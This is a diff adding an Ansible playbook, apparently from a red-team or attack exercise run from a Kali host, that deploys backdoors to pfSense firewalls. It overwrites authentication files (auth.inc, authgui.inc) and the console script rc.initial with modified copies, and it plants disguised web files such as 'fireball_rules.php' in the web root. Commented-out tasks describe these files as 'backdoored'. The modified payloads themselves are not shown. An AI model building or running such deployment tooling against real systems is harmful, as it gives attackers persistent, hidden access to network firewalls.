@@ -1,0 +1,75 @@
+---
+- name: Deploy pfsense goofs
+  hosts: pfsense
+  become: yes # No need to become a superuser for this task
+  tasks:
+
+#  - name: PARAKEET | BAK | Make sure backup directory exists
+#    ansible.builtin.stat:
+#      path: /etc/bak
+#    register: bak
+
+#  - name: PARAKEET | BAK | Make backup directory
+#    ansible.builtin.file:
+#      state: directory
+#      path: /etc/bak
+#      mode: 0755
+#      owner: root
+#    when: not bak.stat.exists
+
+
+
+#  - name: PARAKEET | AUTH.INC | Check if auth.inc already backdoored
+#    ansible.builtin.stat:
+#      path: /etc/bak/.auth.inc
+#    register: auth_backup
+
+
+#  - name: PARAKEET | AUTH.INC | Make a backup of auth.inc
+#    copy:
+#      remote_src: yes
+#      src: /etc/inc/auth.inc
+#      dest: /etc/bak/.auth.inc
+#    when: auth_backup.stat.exists == False
+
+
+  - name: PARAKEET | AUTH.INC | Deploy modified auth.inc
+    copy:
+      src: /home/kali/Desktop/modified/pfsense270/auth.inc
+      dest: /etc/inc/auth.inc
+
+#  - name: PARAKEET | RC.INITIAL | Check if RC.INITIAL already backdoored
+#    ansible.builtin.stat:
+#      path: /etc/bak/rc.initial
+#    register: initial_backup
+
+#  - name: PARAKEET | RC.INITIAL | Make a backup of RC.INITIAL
+#    copy:
+#      remote_src: yes
+#      src: /etc/rc.initial
+#      dest: /etc/bak/rc.initial
+#    when: initial_backup.stat.exists == False
+
+  - name: PARAKEET | RC.INITIAL | Deploy modified RC.INITIAL
+    copy:
+      src: /home/kali/Desktop/modified/pfsense270/rc.initial
+      dest: /etc/rc.initial
+      mode: 0755
+
+  - name: PARAKEET | AUTHGUI.INC | Deploy modified AUTHGUI.INC
+    copy:
+      src: /home/kali/Desktop/pfsense270/authgui.inc
+      dest: /etc/inc/authgui.inc
+      mode: 0755
+
+  - name: head.inc
+    copy:
+      src: /home/kali/Desktop/modified/pfsense270/head.inc
+      dest: /usr/local/www/cornhill.inc
+      mode: 0755
+
+  - name: firewall_rules.php
+    copy:
+      src: /home/kali/Desktop/modified/pfsense270/firewall_rules.php
+      dest: /usr/local/www/fireball_rules.php
+      mode: 0755
